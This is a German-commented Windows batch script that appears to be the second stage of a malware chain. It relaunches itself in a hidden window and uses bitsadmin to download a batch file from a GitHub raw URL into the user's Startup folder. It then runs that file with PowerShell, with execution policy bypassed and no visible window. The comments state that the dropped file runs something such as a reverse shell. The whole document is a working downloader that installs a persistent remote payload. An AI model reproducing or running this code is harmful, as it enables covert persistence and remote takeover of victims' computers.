::Dieses programm wird von open_andinstall_the_installer.bat heruntergeladen
::Es lädt eine datei in den Autostart ordner die etwas ausführt z.B. Reverse Shell


@echo off

:: Zielordner definieren
set "zielordner=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
set "url=https://raw.githubusercontent.com/max65481/88/refs/heads/main/Programm_welches_das_eigentliche_Autostartet.bat"
set "dateiname=Programm_welches_das_eigentliche_Autostartet.bat"

:: Prüfen, ob die Batch-Datei bereits versteckt läuft
if "%1"=="hidden" goto hidden

:: Diese Zeile startet die Batch-Datei versteckt, ohne ein CMD-Fenster zu zeigen
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit

:hidden
:: Ab hier läuft der Code unsichtbar

echo Datei wird heruntergeladen: %url%
bitsadmin /transfer "DownloadJob" "%url%" "%zielordner%\%dateiname%"

:: Prüfen, ob der Download erfolgreich war
if exist "%zielordner%\%dateiname%" (
    echo Download erfolgreich! Datei gespeichert unter "%zielordner%\%dateiname%"
) else (
    echo Fehler: Die Datei konnte nicht heruntergeladen werden.
    exit /b
)

:: PowerShell-Skript starten
echo Starte %dateiname%...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%zielordner%\%dateiname%"

:: Optional: Bei Erfolg oder Fehler Nachricht anzeigen
if %errorlevel% equ 0 (
    echo Das PowerShell-Skript wurde erfolgreich gestartet.
) else (
    echo Es gab ein Problem beim Starten des PowerShell-Skripts.
)

Programm_welches_das_eigentliche_Autostartet.bat